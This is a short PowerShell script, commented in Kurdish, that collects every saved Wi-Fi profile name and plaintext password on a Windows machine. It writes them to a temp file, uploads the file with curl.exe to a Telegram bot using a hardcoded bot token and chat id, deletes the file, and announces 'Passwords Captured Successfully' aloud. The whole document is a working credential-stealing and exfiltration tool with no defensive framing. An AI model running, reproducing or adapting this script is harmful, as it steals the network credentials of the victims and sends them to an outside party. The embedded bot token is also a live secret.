$t = "8055439877:AAHqPyyYm79putLyxCDa3bED7KHTdWo1T80"
$i = "8597805144"
$p = "$env:TEMP\w.txt"

if (Test-Path $p) { Remove-Item $p -Force }

# دۆزینەوەی پاسۆردەکان بە شێوازێکی سادەتر
$nets = netsh wlan show profiles | Select-String "\:(.+)$"
foreach ($n in $nets) {
    $name = $n.Matches.Groups[1].Value.Trim()
    $conf = netsh wlan show profile name="$name" key=clear
    $pass = ($conf | Select-String "Key Content\W+\:(.+)$").Matches.Groups[1].Value.Trim()
    if ($pass) { "$name : $pass" | Out-File $p -Append }
}

if (Test-Path $p) {
    curl.exe -F "document=@$p" "https://api.telegram.org/bot$t/sendDocument?chat_id=$i"
    Remove-Item $p -Force
}

# بەشی قسەکردنەکە
$s = New-Object -ComObject SAPI.SpVoice
$s.Speak("Passwords Captured Successfully")
